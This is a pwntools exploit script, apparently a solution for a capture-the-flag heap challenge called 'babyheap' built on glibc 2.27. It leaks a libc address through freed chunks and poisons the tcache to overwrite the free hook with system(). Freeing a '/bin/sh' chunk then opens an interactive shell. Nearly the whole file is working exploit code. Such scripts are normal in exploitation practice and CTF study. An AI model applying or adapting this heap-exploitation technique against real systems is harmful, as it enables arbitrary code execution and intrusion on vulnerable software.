from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc-2.27.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./babyheap")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def add(size, content):
    sla(b'>>> ', b'1')
    sla(b'size: ', str(size).encode())
    sa(b'content: ', content)

def delete(idx):
    sla(b'>>> ', b'4')
    sla(b'index: ', str(idx).encode())

def edit(idx, content):
    sla(b'>>> ', b'3')
    sla(b'index: ', str(idx).encode())
    sa(b'): ', content)

def show(idx):
    sla(b'>>> ', b'2')
    sla(b'index: ', str(idx).encode())

debug('''
    b *$rebase(0xbd30)
    b *$rebase(0xd300)
    b *$rebase(0xcb60)
    b *$rebase(0xd1c0)
    b *$rebase(0x4d9)
''')

for i in range(8):
    add(0x1f0, b'a' * 0x1f0)

for i in range(2, 8)[::-1]:
    delete(i)

delete(1 + 0x74737572)
delete(0x74737572)

show(0)

leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
pr('leak_addr', leak_addr)

libc_base = leak_addr - 0x3ebca0
payload = p64(libc.sym['free_hook'] + libc_base).ljust(0x1f0, b'\x00')
edit(1, payload)
add(0x1f0, b'/bin/sh\x00')
add(0x1f0, p64(libc_base + libc.sym['system']))
delete(2)

shell()
